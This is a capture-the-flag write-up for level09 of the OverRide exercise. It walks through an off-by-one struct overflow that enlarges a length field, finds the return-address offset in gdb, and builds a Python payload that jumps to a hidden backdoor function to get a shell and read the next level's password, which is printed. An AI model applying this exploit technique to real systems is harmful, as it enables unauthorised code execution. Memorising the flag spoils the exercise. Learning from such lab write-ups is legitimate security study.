Level09 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
```

Level09 rights:
```Shell
level09@OverRide:~$ ls -la level09 
-rwsr-s---+ 1 end users 12959 Oct  2  2016 level09
```

Testing the binary:
```Shell
level09@OverRide:~$ ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: lrandria
>: Welcome, lrandria
>: Msg @Unix-Dude
>>: hola mi amor
>: Msg sent!
```
The program takes a username and a message. Let's see if we can exploit the way it stores our input.

Decompiling with Hex-Rays on https://dogbolt.org/ shows us that:
- there is an unused function `secret_backdoor()` that could open a shell
- a `user` struct probably exists because the program uses the [address of the buffer] to store a `string` (message), [address of the buffer + 140] to store another `string` (username) and [address of the buffer + 180] to store an `int` (size message):
```
    char    message[140];
    char    name[40];
    int     size;
```
- an overflow is possible because `name` is only 40-bytes long, but there is an off-by-one byte error when copying user input into it.

Since we're dealing with a struct, this extra 1-byte from `name` will allow us to modify the value of `size`. It is the third argument of `strncpy()` when copying user input into `message`, which is only 140-bytes long. So the goal is to overflow `message` by making `size` big enough. This would allow us to reach `EIP` (located somewhere after the struct) with the address of `secret_backdoor()`.
In a nutshell, we must:
- first modify `size` to a bigger value
- overflow `message` enough to reach `EIP` and find the offset
- insert the address of `secret_backdoor()` at the end of our payload

The first part of our payload will consist of [padding to fill `name`] + [the desired `size` value]. Then we will add some more [padding to go beyond the struct] and finish with `secret_backdoor()`.
The `size` value is pretty straightforward: we want the highest possible which is `\xff` (255 bytes).

Now let's find the offset needed to reach `EIP`. We are sending some padding, the size we want and a buffer overflow pattern:
```Shell
level09@OverRide:~$ python -c 'print("A" * 40 + "\xff\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A")' > /tmp/payload09
```

We get a segfault in `handle_msg()`, so let's inspect the registers:
```Shell
Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
(gdb) info registers
[...]
rbp            0x6741356741346741       0x6741356741346741
[...]
```
We realise that `EBP` has been overwritten by our pattern and it gives us an offset of 192. But since it's not `EBP` we're interested in, but rather `EIP`, we have to add 8-bytes to obtain the correct offset: `200`.

Now, let's retrieve the address of `secret_backdoor()`:
```Shell
Breakpoint 1, 0x0000555555554aac in main ()
(gdb) info functions
All defined functions:

Non-debugging symbols:
[...]
0x000055555555488c  secret_backdoor
```

Perfect! We can build our payload with all these elements:
```Shell
level09@OverRide:~$ python -c 'print("A" * 40 + "\xff\n" + "A" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1])' > /tmp/payload09
```

And here is the result, after entering `/bin/sh` as the input to `secret_backdoor()`:
```Shell
level09@OverRide:~$ cat /tmp/payload09 - | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
/bin/sh         
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```